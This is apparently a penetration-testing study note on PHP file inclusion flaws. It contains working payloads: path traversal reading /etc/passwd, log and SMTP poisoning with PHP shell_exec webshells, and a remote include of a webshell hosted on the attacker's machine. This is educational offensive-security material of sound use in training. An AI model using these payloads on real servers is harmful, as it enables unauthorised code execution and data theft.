---
title: File Inclusion
date: 2020-06-29 21:44:39
tags: [oscp, lfi, local file inclusion, rfi, remote file inclusion, web attacks]
---

# File Inclusion
## Introduction

File inclusion vulnerabilities are of two types: **Remote File Inclusion (RFI)** and **Local File Inclusion (LFI)**.
**RFI** is said to be present when a web application allows remote users to load and execute a remote file on the server.
**LFI** is said to be present when a web application allows remote users to load any pre-existing file and execute it on the server.

These vulnerabilities are often found in poorly written and/or deployed web applications which loads files or content to display it to the end-user, completely forgetting that *this* input could be modified.

## LFI
### Vulnerabiltiy
What enables an attacker to exploit these vulnerabilities are `include` and `require` statements in the web applications' PHP code. With improper or thereof lack of input validation in place, an attacker could load any file that is present on the system, effectively exploiting a Local File Inclusion vulnerability.

### Vulnerability Analysis
What is going on behind the scenes?

Example: loading a file from a URL parameter - filename 
URL : http://example.com/index.php?filename=helloworld
Code :
``` php
include($_GET['filename'] . '.php');
```
Web servers are dumb. The example code above basically tells the server that "Hey, whatever comes in the `filename` parameter append '.php' to that, fetch it for me, execute it and show it to the user." Very convenient. So if any user were to pass some query to the `filename` parameter, the server will accept it, try to find the file, and show it to you if it exists in the place you asked it to look for, and if it has read permissions over the file.

If you thought "but Karan, wouldn't the above code append '.php' to the query I pass? Wouldn't the server execute it? How will I view the contents of it?", you're abosultely thinking in the right direction. If not, it's ok, you'll get there. I'll cover that in the next section.

### Vulnerability Testing
**When to test**
``` bash
# URL or Post request
?file=x
?page=x.php
# Target both
?lang=en&post=x
```
**Testing**

In PHP below version 5.3, URL ending in `%00`, a null-byte termination, causes the interpreter to accept it as the legit URL termination point and will ignore anything that comes after it like the '.php' extension that normally would be appended in the above example

Use different tricks or payloads. <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File Inclusion">PayloadsAllTheThings</a> is a great resource. When the above trick fails, you can use plenty of others present in PayloadsAllTheThings. (I usually try a `php://` filter next)
``` bash
# Add php at the end
?file=x.<php>

# Fetch a random file - Errors are nice
?file=<random>.php


# Keep the original path there, backtrack from there
?page=files/ninevehNotes/../../../../../../../etc/passwd

# PHP version below 5.3.4 - %00 for filename termination
?page=files/ninevehNotes/../../../../../../../etc/passwd%00

# Full path
?file=C:\Windows\System32\drivers\etc\hosts
```

### LFI To RCE

#### Log Poisoning 

##### Log Locations

First check if logs are accessible
``` bash
# Apache FreeBSD
/var/log/httpd-access.log

# Apache Ubuntu or Debian
/var/log/apache2/access.log

# Apache XAMPP
C:\XAMPP\apache\logs\access.log
```
##### Exploiting 

Method 1: Sending a malicious request but malformed
``` php
# Always use single-quotes in the PHP payload
# Logs use double-quotes almost always
# Connect to target
nc -nv $target [port]

# Send the following request
# Test with system(), exec(), shell_exec()
<?php shell_exec($_REQUEST['cmd']);?>
```

Method 2: Sendind a malicious request but legitimate
``` php
# Capture a request using a proxy (BurpSuite)
# Modify User-Agent HTTP header
# Test with system(), exec(), shell_exec()
User-Agent: <?php shell_exec($_REQUEST['cmd']);?>
```

#### Via SMTP
``` bash
telnet $target 25
# Wait for server to respond
EHLO anyname
VRFY target@victim
mail from:hacker@pwn.com
rcpt to:target@victim
data
Subject: Nothing to look here
<?php echo system($_REQUEST['cmd']);?>
# Enter a blank line
. # Enter a period
# wait for server response, exit
```

### Getting Code Execution
Browse to the payload. Always execute the simplest command first.
``` bash
?file=../../../../../var/mail/target&cmd=id
?page=../../../../../../var/log/apache2/access.log&cmd=id
```

## Vulnerability - RFI

What enables attackers to exploit RFI is not just poorly written application but also poorly configured PHP.
Along with the usage `include` or `require` statements in the web application, the PHP must be configured to allow `filesystem` functions to use URLs to fetch data from.

### Vulnerability Analysis

These insecure configurations options are - `allow_url_fopen` and `allow_url_include`, and both should be set to **On** for RFI to occur. These options can viewed in the *phpinfo* file

What is going on behind the scenes?

Example: loading a file from a URL parameter - filename 
URL : http://example.com/index.php?filename=helloworld
Code :
``` php
include($_GET['filename'] . '.php');
```

The above code tells the server that, "Hey, whatever comes in the `filename` parameter append '.php' to that, fetch it for me, execute it and show it to the user." Pretty much like LFI, except now the query to `filename` parameter doesn't need to be a local file, it can be any file from anywhere. As long as the vulnerable server could connect to it and a file with the queried name is present, it'll fetch it, and execute it. This makes RFI very dangerous. 

### Vulnerability Testing
**When to test**
PHPInfo should show that these parameters are On. If phpinfo file is unavailable and/or cannot be accessed, testing for RFI should still be done.
``` bash
# URL or Post request
?file=x
?page=x.php
# Target both
?lang=en&post=x
```
**Testing**
First test should be if the server actually connects to you or not.
Start a webserver and fetch nothing
``` bash
# First test
?file=http://$your_ip

# Second test
# Create a phpinfo file on the attacking machine and host it
# File contents:    <?php phpinfo();?>
# Check important functions in 'disabled_functions' : system(), exec(), shell_exec(), etc
?file=http://$your_ip/info.php
```
### Getting Code Execution
``` bash
# Webshell
# Contents: <?php shell_exec($_GET['cmd']);?>
?file=http://$your_ip/shell.php&cmd=id
```